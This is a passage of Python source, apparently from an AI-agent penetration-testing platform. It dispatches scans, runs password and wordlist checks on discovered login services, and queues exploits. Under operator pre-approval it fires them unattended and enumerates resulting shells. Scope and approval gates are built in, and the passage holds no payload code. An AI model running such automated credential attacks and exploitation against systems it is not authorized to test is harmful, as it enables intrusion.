            # this IP", e.g. msf_home) is the operator's advance authorization
            # too — the same reasoning that lets it skip the exploit interrupt.
            # Without this, exploits auto-ran via the rule but password guessing
            # never became available, so credential testing silently never ran.
            try:
                _rule_name, _ = _target_rule_preapproval(sid)
            except Exception:  # noqa: BLE001
                _rule_name = None
        if preapproved or _rule_name:
            names = names | SCAN_TOOLS_CREDENTIAL
            creds_enabled = True
            _creds_auth = ("operator pre-approval" if preapproved
                           else f"standing rule '{_rule_name}'")

    system = _SCAN_SYSTEM_DISPATCH if auto else _SCAN_SYSTEM_PLAN
    try:
        # Say the credential tools exist when they do. A tool the agent is never
        # told about tends not to get chosen: the previous run had ftp, ssh,
        # telnet and vnc open and still ran no credential check.
        cred_note = (f"\nCredential testing IS authorised for this target "
                     f"({_creds_auth}). If you find authentication "
                     "services — ftp, ssh, telnet, smb, vnc, rdp, mysql, "
                     "postgres — run start_credential_check on them, and "
                     "start_brutus where a wordlist attack is warranted. Both "
                     "are scope-gated and rate-bounded." if creds_enabled else "")
        task = (f"Target: {state['target'][:300]}\nTask: {state['task'][:300]}\n"
                f"auto_execute={'ON' if auto else 'OFF'}. Decide what to scan next"
                f"{' and launch it' if auto else ''}.{cred_note}")
        final, used = _llm_phase(sid, agent_name="Scanner", system=system,
                                 tool_names=names, task=task,
                                 recursion_limit=(24 if auto
                                                  else PHASE_STEP_BUDGET["Scanner"]))
        dispatched = sorted({t for t in used if t.startswith("start_")})

        # DETERMINISTIC credential testing. Same reasoning as the concrete-test
        # plan below: the model must not be the reason password guessing never
        # happens. At dispatch time the port scan has not finished, so "if you
        # find auth services, test them" has nothing to act on and the model
        # skips it — so when credential testing is authorised, dispatch it here
        # on the auth services ALREADY known open (scope-gated + rate-bounded in
        # the tool body). Skip if the model already ran it.
        if creds_enabled and "start_credential_check" not in used:
            try:
                _auth_svcs = _discovered_auth_services(target)
                if _auth_svcs:
                    scan_tools.start_credential_check(
                        targets=target, services=",".join(_auth_svcs))
                    dispatched = sorted(set(dispatched) | {"start_credential_check"})
                    _msg(sid, "Scanner",
                         f"[credential testing] Authorised ({_creds_auth}); "
                         f"dispatched start_credential_check on discovered auth "
                         f"service(s): {', '.join(_auth_svcs)} — default/weak "
                         f"password check (scope-gated, rate-bounded).",
                         role="system")
            except Exception as _ce:  # noqa: BLE001
                _log.warning("[%s] deterministic credential check failed: %s", sid, _ce)

        # Append the deterministic plan regardless of what the model produced.
        # Observed twice on one afternoon: the scan agent was rate-limited (429)
        # and fell back, then on the retry it ran fine, never called
        # get_tool_recommendations, and answered "No results yet for redteam3
        # specifically". Concrete tests should not depend on the model choosing
        # to ask for them — the open services are already known, so the plan is
        # cheap and always groundable.
        plan_text, planned = _build_test_plan()
        if planned:
            final = (f"{final}\n\n---\nConcrete tests for the "
                     f"{planned} discovered service(s):\n\n{plan_text}")
        res = _phase_result(sid, "Scanner", "scan", "analyze", final, used)
        res["log"] = [f"scan(llm): dispatched={dispatched} tools={sorted(set(used))}"]
        _emit("langgraph_scan_dispatched", sid,
              {"phase": "scan", "auto_execute": auto, "dispatched": dispatched})
        return res
    except Exception as e:  # noqa: BLE001
        _emit("langgraph_phase_completed", sid,
              {"phase": "scan", "mode": "fallback", "error": str(e)[:200]})
        return _scan_deterministic(state, note=f"[LLM scan unavailable: {e}] ")


# Services that ARE TLS by definition. Note what is absent: port numbers.
# Transport is a property of the connection, not of the port — TLS turns up on
# 8443, 9443, 10443 and arbitrary ports, and plaintext turns up on 443.
# Web-ish service names, for deciding whether "probe both schemes" advice makes
# sense. Mirrors the http family in scan_recommender/exploits_rag.py.
_SERVICE_FAMILIES_WEB = {
    "http", "https", "http-proxy", "http-alt", "https-alt", "ssl/http", "www",
    "http-mgmt", "webcache",
}

_TLS_SERVICE_NAMES = {
    "https", "https-alt", "imaps", "smtps", "ldaps", "ftps", "pop3s", "nntps",
    "ircs", "dot", "sips", "telnets", "rdps", "ssl/http",
}


def _tls_state(service: str, product: str = "", banner: str = "") -> str:
    """'yes' or 'unknown' — never inferred from the port number.

    Deliberately has no port heuristic. This dataset holds 260 rows recorded as
    `http` on port 443 (Apache, Azure Application Gateway, Cloudflare) with NO
    tunnel or TLS field captured anywhere in the row, and 0 rows whose banner
    mentions tls/ssl. So the port would be the only "evidence" available, and it
    is exactly the assumption that produces `nikto -h http://host:443` against a
    TLS listener — a command that fails and tells the operator nothing.

    'unknown' is an honest answer that the plan can act on (probe both), where a
    guess is not.
    """
    svc = (service or "").strip().lower()
    if "ssl" in svc or "tls" in svc:
        return "yes"
    if svc in _TLS_SERVICE_NAMES:
        return "yes"
    blob = f"{product or ''} {banner or ''}".lower()
    if "ssl" in blob or "tls" in blob:
        return "yes"
    return "unknown"


# How many distinct (service, port) pairs the deterministic planner will build
# tests for. Bounded because each one is an HTTP call to the recommender.
_DETERMINISTIC_PLAN_LIMIT = 8


_AUTH_SVC_MAP = {
    "ssh": "ssh", "ftp": "ftp", "telnet": "telnet", "mysql": "mysql",
    "postgresql": "postgres", "postgres": "postgres", "vnc": "vnc",
    "smb": "smb", "microsoft-ds": "smb", "netbios-ssn": "smb",
    "ms-wbt-server": "rdp", "rdp": "rdp", "http-proxy": "", "tomcat": "tomcat",
    "mongodb": "mongodb", "redis": "redis",
}


def _discovered_auth_services(target: str):
    """Credential-check service names for the auth services already discovered
    open on this target (from the ports table). Deterministic input to credential
    testing — no dependency on the model 'seeing' the services."""
    try:
        from db_utils import get_db
        with get_db() as conn, conn.cursor() as cur:
            cur.execute(
                "SELECT DISTINCT lower(p.service) FROM ports p "
                "JOIN assets a ON p.asset_id = a.id "
                "WHERE host(a.ip) = %s AND COALESCE(p.is_open, true) "
                "  AND p.service IS NOT NULL", (str(target).split('/')[0],))
            svcs = {r[0] for r in cur.fetchall()}
        out = set()
        for sv in svcs:
            mapped = _AUTH_SVC_MAP.get((sv or "").strip())
            if mapped:
                out.add(mapped)
        return sorted(out)
    except Exception as e:  # noqa: BLE001
        _log.debug("auth-service discovery failed for %s: %s", target, e)
        return []


def _build_test_plan(_unused_target: str = "") -> "tuple[str, int]":
    """Concrete, runnable tests for the services already discovered.

    Returns (plan_text, service_count). No LLM: the platform already knows the
    open services, and get_tool_recommendations returns the tools, command
    templates, nuclei tags and ingested methodology for each. That is enough to
    write the plan.

    The `{target}` placeholder is filled from the PORT ROW's ip, never from the
    session's target_description. The description is a human label — filling it
    in produced `sslscan redteam3 web hosts:443`, which reads like a command and
    cannot be run. Each row already carries the host the service was found on.
    """
    hosts: dict = {}
    plan = []
    try:
        ports = json.loads(_tool(scan_tools.query_open_ports, limit=100))
        items = ports.get("items") or []
    except Exception:  # noqa: BLE001
        items = []
    _plat = _infer_target_platform(items)

    # Group by (service, port), remembering one real host and how many share it.
    for row in items:
        svc = (row.get("service") or "").strip().lower()
        port, ip = row.get("port"), row.get("ip")
        if not svc or not ip:
            continue
        entry = hosts.setdefault((svc, port), {"ip": ip, "count": 0, "tls": "unknown"})
        entry["count"] += 1
        # Any row in the group proving TLS proves it for the group.
        if _tls_state(svc, row.get("product"), row.get("banner")) == "yes":
            entry["tls"] = "yes"

    for (svc, port), info in list(hosts.items())[:_DETERMINISTIC_PLAN_LIMIT]:
        target = info["ip"]
        tls = info["tls"]
        try:
            rec = json.loads(_tool(scan_tools.get_tool_recommendations,
                                   service=svc, port=port))
        except Exception:  # noqa: BLE001
            continue
        tools = rec.get("tools") or []
        if not tools and not rec.get("nuclei_tags"):
            continue
        extra = (f" ({info['count']} hosts; example {target})"
                 if info["count"] > 1 else f" ({target})")
        lines = [f"### {svc}/{port} — {rec.get('description') or svc}{extra}"]
        for t in tools[:4]:
            cmd = (t.get("command") or "").replace("{target}", target)
            lines.append(f"  - {t.get('name')}: {t.get('purpose')}\n    $ {cmd}")
        if rec.get("nuclei_tags"):
            lines.append(f"  - nuclei tags: {', '.join(rec['nuclei_tags'][:8])}")
        for m in _rank_msf(rec.get("metasploit"), platform=_plat):
            lines.append(f"  - msf: {m.get('module')} — {m.get('purpose')}")
        if rec.get("common_vulns"):
            lines.append(f"  - watch for: {'; '.join(rec['common_vulns'][:4])}")

        # Transport is its own axis. The commands above came from the service
        # name, which does not say whether the connection is wrapped in TLS —
        # and the port does not say it either. Where TLS is confirmed or merely
        # possible, name the TLS tooling explicitly rather than letting a plan
        # go out that only probes one scheme.
        web = svc in _SERVICE_FAMILIES_WEB
        if tls == "yes":
            lines.append(
                f"  - transport: TLS (from the service name/banner). Use "
                f"https:// for web tooling and run the TLS checks: "
                f"sslscan {target}:{port} / testssl.sh {target}:{port} / "
                f"sslyze {target}:{port}")
        elif web:
            lines.append(
                f"  - transport: UNCONFIRMED — nothing in the record says "
                f"whether this is TLS, and the port is not evidence. Probe both "
                f"before committing: "
                f"curl -sI http://{target}:{port}/ and "
                f"curl -skI https://{target}:{port}/ ; if TLS answers, redo the "
                f"web commands above with https:// and add "
                f"sslscan {target}:{port} / testssl.sh {target}:{port}")
        else:
            lines.append(
                f"  - transport: not established as TLS. If this service can be "
                f"TLS-wrapped (many are, on any port), confirm with "
                f"`openssl s_client -connect {target}:{port}` and add "
                f"testssl.sh {target}:{port} when it negotiates")
        plan.append("\n".join(lines))

    return "\n\n".join(plan), len(plan)


def _scan_deterministic(state: PentestState, note: str = "") -> dict:
    """Build a concrete test plan WITHOUT an LLM. Never dispatches.

    This used to ask get_scan_recommendations (free text -> a paragraph) and
    paste the paragraph. When the model is rate-limited — which is exactly when
    this path runs — that paragraph was often "I cannot determine the specific
    services", i.e. the fallback produced nothing usable at the moment it
    mattered most.

    The platform already knows the open services; it does not need a model to
    list them. So walk the discovered (service, port) pairs and ask
    get_tool_recommendations for each: that returns the tools, ready command
    templates, nuclei tags and the ingested methodology for that service. The
    result is an actionable test plan an operator (or the next agent phase) can
    run, produced deterministically and with no LLM involved.
    """
    sid = state["session_id"]
    plan_text, planned = _build_test_plan()

    if planned:
        body = (f"{note}Test plan built from {planned} discovered service(s) "
                f"— no LLM required.\n\n" + plan_text)
        summary = f"scan(deterministic): {planned} service(s) planned"
    else:
        # Nothing discovered yet, so fall back to the free-text recommender.
        ctx = f"target={state['target'][:200]} task={state['task'][:200]}"
        body = (f"{note}No open services on record to plan against yet.\n\n"
                f"{_tool(scan_tools.get_scan_recommendations, ctx)[:1500]}")
        summary = "scan(deterministic): no services, asked the recommender"

    _msg(sid, "Scanner", body[:_MSG_CAP] +
         "\n\nDispatch: skipped (deterministic planner recommends only).")
    _emit("langgraph_phase_completed", sid,
          {"phase": "scan", "mode": "fallback", "services_planned": planned})
    return {"phase": "analyze",
            "findings": [summary],
            "log": [f"scan deterministic: planned {planned} service(s)"]}


def analyze(state: PentestState) -> dict:
    """LLM analysis over the findings we hold (Phase 4 cutover)."""
    sid = state["session_id"]
    try:
        task = (f"Target: {state['target'][:300]}\nTask: {state['task'][:300]}\n"
                "Review the findings held for this target and give the analysis.")
        final, used = _llm_phase(sid, agent_name="Analyzer", system=_ANALYZE_SYSTEM,
                                 tool_names=ANALYZE_TOOLS, task=task,
                                 recursion_limit=PHASE_STEP_BUDGET["Analyzer"])
        return _phase_result(sid, "Analyzer", "analyze", "exploit", final, used)
    except Exception as e:  # noqa: BLE001
        _emit("langgraph_phase_completed", sid,
              {"phase": "analyze", "mode": "fallback", "error": str(e)[:200]})
        return _analyze_deterministic(state, note=f"[LLM analyze unavailable: {e}] ")


#: How long a post-scan re-analysis will wait for the session's scans, and how
#: often it checks. A full 1-65535 sweep is genuinely slow, so the ceiling is
#: generous; the poll is cheap because get_session_scan_status only asks the
#: scanner services for the jobs this session started.
# A full 1-65535 sweep through a proxy/node is genuinely slow — often well over
# an hour — so the ceiling is a safety net against a leaked thread, not a deadline
# for the scan. Default 6h, env-overridable. On hitting it the session is NOT
# force-completed: it stays `scanning` so a long run is never falsely ended.
RESCAN_ANALYSIS_MAX_WAIT_S = int(os.environ.get("RESCAN_ANALYSIS_MAX_WAIT_S") or 21600)
RESCAN_ANALYSIS_POLL_S = int(os.environ.get("RESCAN_ANALYSIS_POLL_S") or 20)

_TERMINAL_SCAN_STATES = {"completed", "failed", "cancelled", "stopped",
                         "completed_with_errors", "partial"}


def _running_scans(sid: str) -> list:
    """The session's scans that have not reached a terminal state.

    Goes through get_session_scan_status because that also REFRESHES each job
    from its scanner service and restores the session from session_scan_metrics
    when the in-memory registry is gone — which it always is by the time this
    runs, since teardown has already cleaned up.
    """
    try:
        status = json.loads(scan_tools.get_session_scan_status(sid))
    except Exception:  # noqa: BLE001
        return []
    out = []
    for s in (status.get("scans") or []):
        if str(s.get("status") or "running").lower() not in _TERMINAL_SCAN_STATES:
            out.append(s)
    return out


#: Scan types (and port ranges) that constitute the slow full-range sweep. The
#: whole point of separating these is that analysis should NOT block on them: the
#: quick discovery scans (masscan top-1000, naabu, targeted nmap, httpx) surface
#: the actionable services in seconds-to-minutes, while a 1-65535 sweep through a
#: proxy/node routinely runs for an hour or more.
_DEEP_SCAN_TYPES = {"full_scan", "deep_port_scan"}


def _is_deep_scan(s: dict) -> bool:
    """True when this scan is the slow full-range port sweep — by declared type
    or by a full-range `ports` param (so a plain nmap `-p-` counts too)."""
    if str(s.get("type") or "").lower() in _DEEP_SCAN_TYPES:
        return True
    ports = str(((s.get("params") or {}).get("ports")) or "").strip().lower()
    return ("1-65535" in ports or "0-65535" in ports
            or ports in ("-", "-p-", "all", "*"))


# Wall-clock ceiling for the post-scan executor so a big queue of MSF exploits
# (each waiting ~20s for a session) cannot run the background thread forever.
POSTSCAN_EXEC_BUDGET_S = int(os.environ.get("POSTSCAN_EXEC_BUDGET_S", "1800"))


def _session_pending_exploit_ids(sid: str) -> list:
    """Still-pending (un-executed) exploit ids for this session, newest first.
    execute_approved_exploit moves a row out of 'pending', so re-running the
    post-scan executor never re-fires one that already ran."""
    try:
        from db_utils import get_db
        with get_db() as conn, conn.cursor() as cur:
            cur.execute(
                "SELECT id::text FROM pending_exploits "
                "WHERE session_id = %s::uuid AND status = 'pending' "
                "ORDER BY created_at DESC LIMIT %s",
                (str(sid), MAX_EXPLOITS_PER_SESSION))
            return [r[0] for r in cur.fetchall()]
    except Exception as e:  # noqa: BLE001
        _log.warning("[%s] pending-exploit lookup failed: %s", sid, e)
        return []


def _fire_and_enumerate(sid: str, base_state: dict) -> None:
    """CLOSE THE LOOP: after a post-scan re-plan queued exploits, actually EXECUTE
    them (when the engagement is pre-approved) and then enumerate the best shell.

    Without this the post-scan re-analysis re-planned exploits but never ran them,
    so ports discovered after the first pass (the common case — the graph finishes
    before the port scan ingests) never became shell attempts. Pre-approval is the
    same authorization gate the exploit phase uses; the scope gate is still
    enforced fail-closed inside execute_approved_exploit."""
    if not base_state.get("exploit_phase"):
        return
    preapproved, eid = _engagement_preapproval(sid)
    if not preapproved:
        _msg(sid, "Exploit",
             "[post-scan] Exploits were queued but this engagement is NOT "
             "pre-approved — they stay pending for operator approval.")
        return
    pending = _session_pending_exploit_ids(sid)
    if not pending:
        return
    _msg(sid, "Exploit",
         f"[post-scan][pre-approved:{eid}] executing {len(pending)} queued "
         f"exploit(s) discovered ports produced, through the scope gate "
         f"(out-of-scope is refused).")
    summary = _execute_pending_exploits(
        sid, pending, approver=f"engagement_preapproval:{eid}",
        note="post-scan auto-exec", agent="Exploit",
        budget_s=POSTSCAN_EXEC_BUDGET_S)
    _emit("langgraph_postscan_exploit_executed", sid,
          {"executed": len(summary["executed"]), "shells": len(summary["shells"]),
           "failed": len(summary["failed"]), "ports": summary["ports"],
           "stopped_early": summary["stopped_early"]})
    _msg(sid, "Exploit",
         f"[post-scan] {len(summary['executed'])} run, "
         f"{len(summary['shells'])} shell(s), {len(summary['failed'])} failed "
         f"across {summary['ports']} port(s)"
         + ("; budget reached, remainder still pending" if summary["stopped_early"] else "")
         + ".")
    # Enumerate the BEST shell for the most info, if a shell landed.
    try:
        through = _enumerate_through_best_access(sid, base_state.get("target") or "")
        if through.get("ran"):
            a = through["access"]
            _msg(sid, "PostEnumeration",
                 f"[post-scan] ran {through['ran']} enumeration step(s) through "
                 f"the best shell: {a['kind']} {a['handle']} "
                 f"(whoami={a.get('whoami') or '?'}, root={a.get('is_root')}).")
    except Exception as e:  # noqa: BLE001
        _msg(sid, "PostEnumeration", f"[post-scan] enumeration failed: {e}")


def _run_analysis_pass(sid: str, base_state: dict, note: str) -> None:
    """Re-run analyze (+ exploit planning when enabled) over whatever results are
    in the database RIGHT NOW, appending messages to this session. Shared by the
    early (quick-scan) pass and the final (all-scans-done) pass. Best-effort:
    never raises into the caller."""
    scan_tracker.set_session(sid)
    scan_tracker.register_run(sid)
    try:
        _msg(sid, "Analyzer", note)
        state = dict(base_state)
        analyze(state)
        if base_state.get("exploit_phase"):
            try:
                exploit_plan(state)
            except Exception as e:  # noqa: BLE001
                _msg(sid, "Exploit", f"[post-scan] exploit planning failed: {e}")
            # Close the loop: execute what was just queued (pre-approved) and
            # enumerate the best shell. Best-effort — never breaks the pass.
            try:
                _fire_and_enumerate(sid, base_state)
            except Exception as e:  # noqa: BLE001
                _msg(sid, "Exploit", f"[post-scan] auto-exec failed: {e}")
    finally:
        try:
            scan_tracker.unregister_run(sid)
        except Exception:  # noqa: BLE001
            pass


def _rerun_analysis_when_scans_finish(sid: str, base_state: dict) -> None:
    """Re-run analysis once the scans this session started have finished.

    WHY THIS EXISTS: the graph is deliberately non-blocking — the scan node
    dispatches and returns, so `analyze` reads the database as it was BEFORE the
    scan ran. Against a host with no prior data that means it analyses nothing,
    reports nothing, and the exploit planner correctly refuses to queue. The run
    looks like a failure when in fact its scans were still in flight.

    Rather than block the session for the length of a 65535-port sweep, the run
    finishes as normal and this waits in the background, then re-runs the
    analysis phases and appends their messages to the SAME session. The operator
    sees the session complete promptly and the real analysis arrive when there is
    something to analyse.

    Bounded and best-effort: it never raises into the caller, and on timeout it
    says so rather than silently doing nothing.
    """
    import time as _time
    deadline = _time.monotonic() + RESCAN_ANALYSIS_MAX_WAIT_S
    waited_for = []
    early_done = False
    try:
        while _time.monotonic() < deadline:
            running = _running_scans(sid)
            if not running:
                break
            waited_for = [s.get("job_id") for s in running]
            # Don't make the agent wait out the full 1-65535 sweep before it
            # touches anything. The moment the QUICK discovery scans are done —
            # even while a deep sweep keeps running — analyse and start exploit
            # planning over what they already found. The final pass below still
            # runs when the deep sweep completes, over the fuller result set.
            deep_running = [s for s in running if _is_deep_scan(s)]
            quick_pending = [s for s in running if not _is_deep_scan(s)]
            if deep_running and not quick_pending and not early_done:
                early_done = True
                _emit("langgraph_early_analysis_started", sid,
                      {"deep_scans_running": len(deep_running)})
                _run_analysis_pass(
                    sid, base_state,
                    "[quick-scan] Discovery scans finished — analysing and "
                    f"planning on them now while {len(deep_running)} full-range "
                    "sweep(s) keep running in the background.")
                _emit("langgraph_early_analysis_completed", sid,
                      {"deep_scans_running": len(deep_running)})
            _time.sleep(RESCAN_ANALYSIS_POLL_S)
        else:
            # Ceiling hit while scans are STILL running. Do NOT force-end the
            # session — leave it `scanning` (honest) so a genuinely long sweep is
            # never falsely marked done. The operator can raise the ceiling or
            # re-run analysis when the scans finish.
            _msg(sid, "Analyzer",
                 f"[post-scan] {len(waited_for)} scan(s) still running after "
                 f"{RESCAN_ANALYSIS_MAX_WAIT_S}s — the session remains IN PROGRESS "
                 f"(status stays 'scanning'), not force-completed. Analysis will "
                 f"need a re-run once they finish (or raise RESCAN_ANALYSIS_MAX_WAIT_S).")
            _emit("langgraph_rescan_analysis_timeout", sid,
                  {"still_running": len(waited_for)})
            return

        # All scans (including any deep sweep) are done — the final pass runs
        # over the complete result set. _run_analysis_pass re-establishes the
        # session context (this thread is not the one that ran the graph).
        _emit("langgraph_rescan_analysis_started", sid,
              {"scans_awaited": len(waited_for)})
        _run_analysis_pass(
            sid, base_state,
            "[post-scan] Scans finished — re-running analysis over the results "
            "they produced.")
        # The scans this session started are done and analysis has re-run over
        # their results — NOW the session is truly complete. Flip `scanning` ->
        # `completed` (a status-only update keeps the metadata _finish wrote), and
        # refresh the scan snapshot so the finished session shows finished scans.
        # Merge onto the metadata _finish wrote (update_agent_session REPLACES
        # metadata, so read-merge-write to keep engine/steps/etc.).
        try:
            meta = dict((get_agent_session(_sid(sid)) or {}).get("metadata") or {})
        except Exception:  # noqa: BLE001
            meta = {}
        meta["post_scan_reanalysis"] = "completed"
        meta["early_analysis"] = "completed" if early_done else "not_triggered"
        meta["scans_in_flight"] = []
        try:
            st = scan_tracker.get_session_status(sid)
            if isinstance(st, dict):
                meta["scans"] = st.get("scans") or meta.get("scans")
                meta["scan_summary"] = st.get("summary") or meta.get("scan_summary")
        except Exception:  # noqa: BLE001
            pass
        try:
            update_agent_session(_sid(sid), status="completed", metadata=meta)
        except Exception as e:  # noqa: BLE001
            _log.warning("[%s] could not finalize session status: %s", sid, e)
        _emit("langgraph_rescan_analysis_completed", sid, {})
    except Exception as e:  # noqa: BLE001
        _log.warning("[%s] post-scan re-analysis failed: %s", sid, e)
    finally:
        try:
            scan_tracker.unregister_run(sid)
        except Exception:  # noqa: BLE001
            pass


def _analyze_deterministic(state: PentestState, note: str = "") -> dict:
    sid = state["session_id"]
    vulns = _tool(scan_tools.query_vulnerabilities, limit=50)
    web = _tool(scan_tools.get_web_findings, limit=50)
    _msg(sid, "Analyzer", f"{note}Vulnerabilities:\n{vulns[:1500]}\n\nWeb findings:\n{web[:1500]}")
    _emit("langgraph_phase_completed", sid, {"phase": "analyze", "mode": "fallback"})
    return {"phase": "exploit",
            "findings": ["analyze(deterministic): vulns + web findings reviewed"],
            "log": ["analyze deterministic: query_vulnerabilities + get_web_findings"]}


def _catalogue_hint_for_target(target: str) -> str:
    """A checklist of the KNOWN service vectors that apply to this target's open
    services, from the same catalogue + generator the surface phase uses
    (knowledge/service_access_methods.yaml via _service_vector_tests). Injected
    into the LLM planner's task so the LLM lane and the surface lane share one
    source of truth — the planner is told the marquee vectors up front rather
    than rediscovering them, and must queue or explicitly dismiss each.

    Deliberately does NOT queue anything itself: create_pending_exploit has no
    dedup, so the authoritative deterministic queueing stays in surface_plan.
    This closes the "LLM never picked it" gap without double-queuing.
    """
    try:
        ports = json.loads(_tool(scan_tools.query_open_ports, target=target, limit=100))
        items = ports.get("items") or []
        cands = _service_vector_tests(items)
    except Exception:  # noqa: BLE001
        return ""
    seen, lines = set(), []
    for c in cands:
        vec = c.get("vector") or {}
        vid = vec.get("vector_id")
        if not vid or vid in seen:
            continue
        seen.add(vid)
        ref = c.get("exploit_ref") or {}
        how = ref.get("module") or c.get("command") or ""
        lines.append(f"  - {vid} on {c.get('service') or '?'}:{c.get('port') or '?'} "
                     f"({ref.get('source')}: {str(how)[:70]})")
    if not lines:
        return ""
    return ("\nKNOWN high-value vectors that apply to this target's open services "
            "(from the service-vector catalogue). Queue each one for approval or "
            "state explicitly why it does not apply — do not silently skip:\n"
            + "\n".join(lines))


def exploit_plan(state: PentestState) -> dict:
    """Pick a candidate and queue it for approval. Read-only + a pending_exploits
    row; nothing is executed here.

    This is deliberately a SEPARATE node from the interrupt: a node containing
    interrupt() re-runs from its start when the graph resumes, so any side effect
    in front of the interrupt would happen twice (a duplicate queued exploit, a
    second LLM bill). Side effects live here; the interrupt node has none before
    it pauses.
    """
    sid = state["session_id"]
    try:
        catalogue_hint = _catalogue_hint_for_target(state["target"])
        task = (f"Target: {state['target'][:300]}\nTask: {state['task'][:300]}\n"
                f"Session id (pass as session_id when queueing): {sid}\n"
                "Identify EVERY well-evidenced exploitation candidate and queue "
                "each one for operator approval, strongest evidence first. Name "
                "the services you examined and dismissed, so the operator can "
                "tell 'considered and rejected' from 'never looked at'."
                + catalogue_hint)
        final, used = _llm_phase(sid, agent_name="Exploit", system=_EXPLOIT_SYSTEM,
                                 tool_names=EXPLOIT_PLAN_TOOLS, task=task,
                                 recursion_limit=PHASE_STEP_BUDGET["Exploit"])
        queued = "queue_exploit_for_approval" in used
        distinct = sorted(set(used))
        _msg(sid, "Exploit",
             f"[LLM exploit planning] tools used: {', '.join(distinct) or 'none'}\n\n"
             f"{final[:1800]}")
        _emit("langgraph_phase_completed", sid,
              {"phase": "exploit_plan", "mode": "llm", "queued": queued,
               "tools_used": distinct})
        return {"phase": "exploit_approval" if queued else "report",
                "exploit_candidate": final[:2000] if queued else None,
                "findings": [f"exploit_plan(llm): queued={queued}"],
                "log": [f"exploit_plan(llm): queued={queued} tools={distinct}"]}
    except Exception as e:  # noqa: BLE001
        # No candidate, no interrupt — an LLM outage must not park a session
        # waiting for approval of something that was never queued.
        _emit("langgraph_phase_completed", sid,
              {"phase": "exploit_plan", "mode": "fallback", "error": str(e)[:200]})
        _msg(sid, "Exploit", f"[LLM exploit planning unavailable: {e}] "
                             "No candidate queued; skipping the approval gate.")
        return {"phase": "report", "exploit_candidate": None,
                "findings": ["exploit_plan: skipped (LLM unavailable)"],
                "log": [f"exploit_plan skipped: {e}"]}


def _engagement_preapproval(sid: str):
    """(enabled, engagement_id) — has the operator pre-approved exploit
    execution for THIS session's engagement?

    WHY THIS IS NOT AN OVERRIDE. CLAUDE.md draws the line at override flags
    overruling the operator's AUTHORIZATION. Pre-approval is the opposite: the
    operator selecting it, for one named engagement, IS the authorization —
    given in advance rather than at the interrupt. Same reasoning as the standing
    rules in exploit_approval_rules.

    What it deliberately does NOT do:
      * it is per ENGAGEMENT, never global — other engagements are unaffected;
      * it is off unless explicitly set;
      * it does not touch the scope gate. execute_approved_exploit still fails
        closed on scope, so a pre-approved out-of-scope target stays refused;
      * it is recorded, not silent — reviewed_by names the engagement, a session
        message says it happened, and a webhook event carries it.
    """
    try:
        cfg = (get_agent_session(_sid(sid)) or {}).get("configuration") or {}
        eid = cfg.get("engagement_id")
        if not eid:
            return False, None
        from db_utils import get_db
        with get_db() as conn, conn.cursor() as cur:
            cur.execute(
                "SELECT COALESCE((metadata->>'exploit_preapproved')::boolean, false) "
                "FROM engagements WHERE id = %s::uuid", (str(eid),))
            row = cur.fetchone()
        return (bool(row[0]) if row else False), str(eid)
    except Exception as e:  # noqa: BLE001
        # Fail CLOSED: an unreadable setting is not pre-approval.
        _log.warning("[%s] pre-approval lookup failed (%s) — parking as usual",
                     sid, e)
        return False, None


# A ceiling on how many exploits one session may execute, even with every one
# approved. Exploits are heavier and less reversible than scans, and a planner
# that queues thirty against one host should still not fire thirty unattended.
# Sanity bound on how many queued candidates pre-approval (or the operator's
# "approve everything") will approve for one session. Generous on purpose: the
# real execution governor is now MAX_EXPLOITS_PER_PORT (below). A flat session
# total was the wrong shape — it dropped whole ports (the first N by age),
# leaving a foothold on a later service never tried. This only stops a
# pathological queue of thousands being approved in one go.
MAX_EXPLOITS_PER_SESSION = int(os.environ.get("MAX_EXPLOITS_PER_SESSION", "200"))

# How many exploits may be attempted against a SINGLE unique port before moving
# on. Per-port, not per-session: every unique port gets its shell-yielding
# exploits attempted. A port stops early the moment one attempt yields a shell —
# there is no value in a second foothold on a port we already hold, and the
# access ranker measures and picks among shells across ports afterwards.
MAX_EXPLOITS_PER_PORT = int(os.environ.get("MAX_EXPLOITS_PER_PORT", "25"))

# Exploit types that can hand back an interactive shell / session. Only these
# satisfy the "stop this port on first shell" condition; dos and pure scanners
# never do, so on a port they are attempted only after the shell-yielding ones.
_SHELL_EXPLOIT_TYPES = {"rce", "file_upload"}


def _pending_exploits_for_session(sid: str):
    """Every exploit THIS session queued and has not had decided, newest first.

    Resolved here because nothing in graph state carries the id — exploit_plan
    stores the LLM's text, and at the interrupt the operator supplies the id by
    hand. Pre-approval has no operator to ask, so it looks up what the session
    itself queued; scoping the query to session_id is what stops it approving
    some other run's exploit.
    """
    try:
        from db_utils import get_db
        with get_db() as conn, conn.cursor() as cur:
            cur.execute(
                "SELECT id FROM pending_exploits "
                " WHERE session_id = %s::uuid AND status = 'pending' "
                " ORDER BY created_at DESC LIMIT %s", (str(sid), MAX_EXPLOITS_PER_SESSION))
            rows = cur.fetchall()
        return [str(r[0]) for r in rows]
    except Exception as e:  # noqa: BLE001
        _log.warning("[%s] pending-exploit lookup failed: %s", sid, e)
        return None


def _target_rule_preapproval(sid: str):
    """(rule_name, engagement_id) if a STANDING exploit_approval_rule pre-authorises
    auto-execution for THIS session's target — the operator's advance
    authorization, per target, exactly like engagement pre-approval (e.g. an
    "approve everything for 192.168.1.150" rule). Matches an enabled + approved +
    auto_execute rule whose target pattern matches the session target and whose
    engagement is this session's or NULL (any). Uses the SAME matcher as the
    server-side sweep (etl.approval_match) so the graph and the sweep never
    disagree. Scope is still enforced at execution."""
    try:
        row = get_agent_session(_sid(sid)) or {}
        cfg = row.get("configuration") or {}
        target = (row.get("target_description") or cfg.get("target_description") or "").strip()
        eid = cfg.get("engagement_id")
        if not target:
            return None, None
        try:
            from etl.approval_match import matches as _rule_matches
        except Exception:  # noqa: BLE001
            def _rule_matches(pat, val):
                return str(pat).strip() == str(val).strip()
        from db_utils import get_db
        with get_db() as conn, conn.cursor() as cur:
            cur.execute(
                "SELECT name, target, engagement_id::text FROM exploit_approval_rules "
                "WHERE enabled = true AND approved = true AND auto_execute = true "
                "  AND (engagement_id IS NULL OR engagement_id = %s::uuid)",
                (str(eid) if eid else None,))
            rules = cur.fetchall()
        for name, rtarget, reng in rules:
            if rtarget and _rule_matches(rtarget, target):
                return name, reng
        return None, None
    except Exception as e:  # noqa: BLE001
        # Fail CLOSED: an unreadable rule set is not authorization — park as usual.
        _log.warning("[%s] standing-rule pre-approval lookup failed (%s) — parking",
                     sid, e)
        return None, None


def exploit_approval(state: PentestState) -> dict:
    """The human-in-the-loop gate: `interrupt()` parks the graph in Postgres until
    the operator answers via POST /pentest/{id}/approve.

    Override flags do NOT apply here — this gate is the operator's authorization,
    and there is no 'run anyway'. Everything before the pause lives in
